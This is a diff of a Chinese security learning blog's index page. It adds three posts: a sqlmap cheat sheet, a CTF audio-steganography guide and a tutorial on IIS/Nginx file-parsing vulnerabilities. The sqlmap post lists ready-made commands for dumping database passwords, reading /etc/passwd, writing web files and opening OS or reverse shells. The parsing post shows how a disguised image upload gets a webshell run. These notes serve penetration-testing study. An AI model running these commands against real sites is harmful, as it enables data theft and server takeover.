@@ -46,7 +46,7 @@
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
 			
-			<img lazy-src="https://www.bing.com/images/search?view=detailV2&amp;ccid=G3ErK0DM&amp;id=9C8AB1F25907E006C60EC59B40FFBFAC7E7D6C98&amp;thid=OIP.G3ErK0DMefooE9z04t0T5QHaH_&amp;mediaurl=https%3a%2f%2fimg.zcool.cn%2fcommunity%2f0189c159004572a801214550774134.png%401280w_1l_2o_100sh.png&amp;exph=1381&amp;expw=1280&amp;q=%e5%a4%b4%e5%83%8f%e5%be%a1%e5%9d%82%e7%be%8e%e7%90%b4&amp;simid=608027950704124195&amp;FORM=IRPRST&amp;ck=34638664163971633DB391E31144C1B3&amp;selectedIndex=20" class="js-avatar">
+			<img lazy-src="touxiang/t.jpg" class="js-avatar">
 			
 		</a>
 
@@ -143,7 +143,7 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img lazy-src="https://www.bing.com/images/search?view=detailV2&amp;ccid=G3ErK0DM&amp;id=9C8AB1F25907E006C60EC59B40FFBFAC7E7D6C98&amp;thid=OIP.G3ErK0DMefooE9z04t0T5QHaH_&amp;mediaurl=https%3a%2f%2fimg.zcool.cn%2fcommunity%2f0189c159004572a801214550774134.png%401280w_1l_2o_100sh.png&amp;exph=1381&amp;expw=1280&amp;q=%e5%a4%b4%e5%83%8f%e5%be%a1%e5%9d%82%e7%be%8e%e7%90%b4&amp;simid=608027950704124195&amp;FORM=IRPRST&amp;ck=34638664163971633DB391E31144C1B3&amp;selectedIndex=20" class="js-avatar">
+				<img lazy-src="touxiang/t.jpg" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author"></h1>
@@ -172,8 +172,8 @@
     <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2023/07/05/hello-world/" class="article-date">
-  	<time datetime="2023-07-05T14:50:25.000Z" itemprop="datePublished">2023-07-05</time>
+      <a href="/2099/07/05/hello-world/" class="article-date">
+  	<time datetime="2099-07-05T14:50:25.000Z" itemprop="datePublished">2099-07-05</time>
 </a>
     </div>
   
@@ -186,7 +186,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2023/07/05/hello-world/">
+      <a class="article-title" href="/2099/07/05/hello-world/">
         欢迎来到allin的博客
         
       </a>
@@ -201,8 +201,673 @@
         <meta name="referrer" content="no-referrer">
 
 <p>欢迎来到我的博客，我是菜鸡，这边还在缓慢建造中，功能不全，较为粗糙，还请见谅，随便看看吧。</p>
-<img src="/2023/07/05/hello-world/image-20230701231949045.png" alt="image-20230701231949045" style="zoom: 200%;">
+<img src="/2099/07/05/hello-world/image-20230701231949045.png" alt="image-20230701231949045" style="zoom: 200%;">
 
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-sqlmap指令" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/07/02/sqlmap%E6%8C%87%E4%BB%A4/" class="article-date">
+  	<time datetime="2023-07-02T02:14:54.000Z" itemprop="datePublished">2023-07-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/07/02/sqlmap%E6%8C%87%E4%BB%A4/">
+        sqlmap指令
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Sqlmap基本操作"><a href="#Sqlmap基本操作" class="headerlink" title="Sqlmap基本操作"></a>Sqlmap基本操作</h1><p>基本操作笔记：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">-u  #注入点 </span><br><span class="line">-f  #指纹判别数据库类型 </span><br><span class="line">-b  #获取数据库版本信息 </span><br><span class="line">-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line">-D &quot;&quot;  #指定数据库名 </span><br><span class="line">-T &quot;&quot;  #指定表名 </span><br><span class="line">-C &quot;&quot;  #指定字段 </span><br><span class="line">-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) </span><br><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="line">--data #通过POST发送数据 </span><br><span class="line">--columns        #列出字段 </span><br><span class="line">--current-user   #获取当前用户名称 </span><br><span class="line">--current-db     #获取当前数据库名称 </span><br><span class="line">--users          #列数据库所有用户 </span><br><span class="line">--passwords      #数据库用户所有密码 </span><br><span class="line">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="line">-U               #指定数据库用户 </span><br><span class="line">--dbs            #列出所有数据库 </span><br><span class="line">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段 </span><br><span class="line">--dump-all            #列出所有数据库所有表 </span><br><span class="line">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span><br><span class="line">--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="line">--os      #指定系统(Linux,Windows) </span><br><span class="line">-v  #详细的等级(0-6) </span><br><span class="line">    0：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    1：显示信息和警告消息。 </span><br><span class="line">    2：显示调试消息。 </span><br><span class="line">    3：有效载荷注入。 </span><br><span class="line">    4：显示HTTP请求。 </span><br><span class="line">    5：显示HTTP响应头。 </span><br><span class="line">    6：显示HTTP响应页面的内容 </span><br><span class="line">--privileges  #查看权限 </span><br><span class="line">--is-dba      #是否是数据库管理员 </span><br><span class="line">--roles       #枚举数据库用户角色 </span><br><span class="line">--udf-inject  #导入用户自定义函数（获取系统权限） </span><br><span class="line">--union-check  #是否支持union 注入 </span><br><span class="line">--union-cols #union 查询表记录 </span><br><span class="line">--union-test #union 语句测试 </span><br><span class="line">--union-use  #采用union 注入 </span><br><span class="line">--union-tech orderby #union配合order by </span><br><span class="line">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) </span><br><span class="line">--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) </span><br><span class="line">--user-agent &quot;&quot;  #自定义user-agent </span><br><span class="line">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span><br><span class="line">--string=&quot;&quot;    #指定关键词,字符串匹配. </span><br><span class="line">--threads 　　  #采用多线程(--threads 3) </span><br><span class="line">--sql-shell    #执行指定sql命令 </span><br><span class="line">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="line">--file-read    #读取指定文件 </span><br><span class="line">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span><br><span class="line">--file-dest    #要写入的文件绝对路径 </span><br><span class="line">--os-cmd=id    #执行系统命令 </span><br><span class="line">--os-shell     #系统交互shell </span><br><span class="line">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="line">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span><br><span class="line">--os-smbrelay  # </span><br><span class="line">--os-bof       # </span><br><span class="line">--reg-read     #读取win系统注册表 </span><br><span class="line">--priv-esc     # </span><br><span class="line">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 </span><br><span class="line">-p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span><br><span class="line">--eta          #盲注 </span><br><span class="line">/pentest/database/sqlmap/txt/</span><br><span class="line">common-columns.txt　　字段字典　　　 </span><br><span class="line">common-outputs.txt </span><br><span class="line">common-tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle-default-passwords.txt </span><br><span class="line">user-agents.txt </span><br><span class="line">wordlist.txt </span><br></pre></td></tr></table></figure>
+
+<p>常用语句 :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 </span><br><span class="line">2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span><br><span class="line">3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span><br><span class="line">4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span><br><span class="line">5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span><br><span class="line">6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 </span><br><span class="line">7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span><br><span class="line">8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 </span><br><span class="line">9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span><br><span class="line">10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span><br><span class="line">11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span><br><span class="line">14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta </span><br><span class="line">15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span><br><span class="line">16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;</span><br><span class="line">17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;</span><br><span class="line">18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span><br><span class="line">19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 </span><br><span class="line">20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner </span><br><span class="line">21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;</span><br><span class="line"></span><br><span class="line">简单的注入流程 :</span><br><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-音频隐写" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/" class="article-date">
+  	<time datetime="2023-07-02T02:11:58.000Z" itemprop="datePublished">2023-07-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/">
+        音频隐写
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>工具：Audacity、Adobe Audition(简称au)、SilentEye、DeepSound、SSTV、mp3stego。</p>
+<p>​    其实和图片一样，数字音频也可以用于信息隐写，音视频隐写会存在比较明显的特征：</p>
+<p>   · 音频载体信号存在冗余，为隐蔽信息提供支持；</p>
+<p>   · 人类听觉系统频谱范围是20Hz18kHz，但对2kHz4kH信息最为敏感；</p>
+<p>   · 人类听觉系统只对相对相位敏感，而无法感知绝对相位。</p>
+<p>​    这里参考一位师傅写的文章</p>
+<blockquote>
+<p>  C语言解析WAV音频文件</p>
+<p>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/guojun-junguo/p/10129548.html">https://www.cnblogs.com/guojun-junguo/p/10129548.html</a></p>
+</blockquote>
+<p>常见题型</p>
+<p>1.Audacity</p>
+<p>作为最常用的音频查看软件，当试听题目音频没有明显杂音或者信息时，一般会选择用Audacity打开</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640.png" alt="图片"></p>
+<p>  并可以选择查看波形、频谱图</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467738.png" alt="图片"></p>
+<p>​    可能会获得morse电码或者二进制的信息,当然部分题目信息量过大，会用到脚本来进行提取</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467739.png" alt="图片"></p>
+<p>​    此外，波形图的上下峰也可能会暗含信息</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467740.png" alt="图片"></p>
+<p>​    出题方式是千变万化，分离左右声道来获得信息，diff反相音频获得信息，通过倒序，反相，慢速，降噪等步骤也视情况尝试（例如：经典的单词模糊听写，需要倒序后慢速听；充斥杂音的音频需要一定程度的降噪才能获得信息；ASCII编码的数字需要注意是否越过127）</p>
+<p>2.SSTV</p>
+<p>把图片隐藏到音频信息中的隐写，手机上可以装Robot36（app），PC可以用MMSSTV。</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467741.png" alt="图片"></p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467742.png" alt="图片"></p>
+<p>3.Deepsound</p>
+<p>​    作为带有密码的音频隐写</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467843.png" alt="图片"></p>
+<p>​    Deepsound的密码可通过john爆破</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467844.png" alt="图片"></p>
+<p>4.Deepsound</p>
+<p>​    作为带有密码的音频隐写</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467843.png" alt="图片"></p>
+<p>​    Deepsound的密码可通过john爆破</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467844.png" alt="图片"></p>
+<p>5.MP3stego</p>
+<p>​    MP3格式文件：</p>
+<p>  cmd打开，将 Decode.exe 拖到命令行里，将要解密的文件放在文件夹中</p>
+<p>  # 隐藏信息</p>
+<p>  # —E 读取隐藏信息文件的内容，-P 设置密码</p>
+<blockquote>
+<p>encode.exe -E hidden.txt -P pass CTF.wav svega_stego.mp3</p>
+</blockquote>
+<p>  # 解密信息</p>
+<blockquote>
+<p>decode.exe -X svega_stego.mp3 -P pass</p>
+</blockquote>
+<p>拨号隐写（DTMF）</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467845.png" alt="图片"></p>
+<blockquote>
+<p>  推荐一个GitHub上的脚本工具</p>
+<p>  <a target="_blank" rel="noopener" href="https://gitcode.net/mirrors/ribt/dtmf-decoder?utm_source=csdn_github_accelerator">https://gitcode.net/mirrors/ribt/dtmf-decoder?utm_source=csdn_github_accelerator</a></p>
+</blockquote>
+<p>6.MIDI隐写</p>
+<p>​     MIDI (mid)， 文件头：4D546864</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467846.png" alt="图片"></p>
+<p>​    乍看没有发现任何信息，但稍微研究一下midi的文件结构，将音乐通道由2改为3</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467847.png" alt="图片"></p>
+<p>​    再重新打开文件，即可发现隐藏通道下的二维码</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467848.png" alt="图片"></p>
+<p>7.信号分析</p>
+<p>​    </p>
+<p>​    包括无线电信号分析，GPS信号分析，一般用Adobe Audition或者Audacity分析；PT2242信号：前面4bit表示同步码，中间的20bit表示地址码，后面的4bit表示功能码，最后一位是停止码。</p>
+<p>8.HackRF区别</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467849.png" alt="图片"></p>
+<p>9.原始数据</p>
+<p>​    当见到音频的后缀为一些奇怪的组合时，比如扩展名为s8，要考虑是否为原始数据，所以在导入时选择导入原始数据</p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467850.png" alt="图片"></p>
+<p><img src="/2023/07/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/640-168826393467851.png" alt="图片"></p>
+<p>​    默认采样率、尾端和编码获取不到信息时，也要根据需要调试（频谱图可以容易的识别出信号的中心频率）</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-文件解析漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/07/02/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="article-date">
+  	<time datetime="2023-07-02T02:10:56.000Z" itemprop="datePublished">2023-07-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/07/02/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">
+        文件解析漏洞
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件解析漏洞主要由于网站管理员操作不当或者 Web 服务器自身的漏洞，导致一些特殊文件被 IIS、apache、nginx 或其他 Web服务器在某种情况下解释成脚本文件执行。</p>
+<p>比如网站管理员配置不当，导致php2、phtml、ascx等等这些文件也被当成脚本文件执行了。甚至某些情况下管理员错误的服务器配置导致.html、.xml等静态页面后缀的文件也被当成脚本文件执行。</p>
+<p>但是，大部分的解析漏洞还是由于web服务器自身的漏洞，导致特殊文件被当成脚本文件执行了。</p>
+<h1 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h1><h2 id="目录解析漏洞-x2F-test-asp-x2F-1-jpg"><a href="#目录解析漏洞-x2F-test-asp-x2F-1-jpg" class="headerlink" title="目录解析漏洞(&#x2F;test.asp&#x2F;1.jpg)"></a>目录解析漏洞(&#x2F;test.asp&#x2F;1.jpg)</h2><p>在 IIS5.x&#x2F;6.0 中，在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了</p>
+<h2 id="文件名解析漏洞-test-asp-jpg"><a href="#文件名解析漏洞-test-asp-jpg" class="headerlink" title="文件名解析漏洞(test.asp;.jpg)"></a>文件名解析漏洞(test.asp;.jpg)</h2><p>在 IIS5.x&#x2F;6.0 中， 分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa  .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <em>.asp;.jpg、</em>.asa;.jpg、*.cer;.jpg 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。</p>
+<h2 id="畸形解析漏洞-test-jpg-x2F-php"><a href="#畸形解析漏洞-test-jpg-x2F-php" class="headerlink" title="畸形解析漏洞(test.jpg&#x2F;*.php)"></a>畸形解析漏洞(test.jpg&#x2F;*.php)</h2><p>微软发布了IIS7.0修补了IIS6.0的解析漏洞，没想到IIS7.0爆出更严重的畸形解析漏洞，于是微软急忙发布了IIS7.5</p>
+<p>在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码</p>
+<p> <a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/i-beta/1964477/202003/1964477-20200308194604304-1865593941.png"><img src="/2023/07/02/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1964477-20200308194604304-1865593941.png" alt="img"></a></p>
+<p>将文件保存成test.jpg格式，上传到服务器，假设上传路径为&#x2F;upload，上传成功后，直接访问&#x2F;upload&#x2F;test.jpg&#x2F;x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。我们会神奇的发现在 &#x2F;upload 目录下创建了一个一句话木马文件 shell.php 。</p>
+<p>临时解决办法：设置 cgi.fix_pathinfo为0</p>
+<p>这个解析漏洞和下面讲的Nginx的解析漏洞是一样的。</p>
+<h2 id="其他解析漏洞"><a href="#其他解析漏洞" class="headerlink" title="其他解析漏洞"></a><strong>其他解析漏洞</strong></h2><p>在windows环境下，**xx.jpg[**<strong>空格]</strong> 或 <strong>xx.jpg.</strong> 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单。若上传成功，空格和点都会被windows自动消除。</p>
+<h1 id="Ngnix解析漏洞"><a href="#Ngnix解析漏洞" class="headerlink" title="Ngnix解析漏洞"></a>Ngnix解析漏洞</h1><h2 id="畸形解析漏洞-test-jpg-x2F-php-1"><a href="#畸形解析漏洞-test-jpg-x2F-php-1" class="headerlink" title="畸形解析漏洞(test.jpg&#x2F;*.php)"></a>畸形解析漏洞(test.jpg&#x2F;*.php)</h2><p>漏洞原因：</p>
+<p>php的配置文件 php.ini 文件中开启了 cgi.fix_pathinfo</p>
+<p>&#x2F;etc&#x2F;php5&#x2F;fpm&#x2F;pool.d&#x2F;<a target="_blank" rel="noopener" href="http://www.conf中不正确的配置security.limit_extensions,导致允许将其他格式文件作为php解析执行/">www.conf中不正确的配置security.limit_extensions，导致允许将其他格式文件作为php解析执行</a></p>
+<p>在nginx&lt;0.8.03环境中，我们新建一个文件，内容为：<?php phpinfo() ?> ，然后将其名字修改为: test.jpg</p>
+<p>在浏览器中访问 <a target="_blank" rel="noopener" href="http://192.168.10.139/test.jpg">http://192.168.10.139/test.jpg</a> 显示图片解析错误。在浏览器中访问 <a target="_blank" rel="noopener" href="http://192.168.10.139/test.jpg/test.php">http://192.168.10.139/test.jpg/test.php</a> ，显示：Access denied. 。这就奇怪了，test.jpg是文件不是目录，test.php更是根本就不存在的文件，访问&#x2F;test.jpg&#x2F;test.php没有报404，而是显示 Access denied. 。</p>
+<p> <a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/i-beta/1964477/202003/1964477-20200308194630679-402859460.png"><img src="/2023/07/02/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1964477-20200308194630679-402859460.png" alt="img"></a></p>
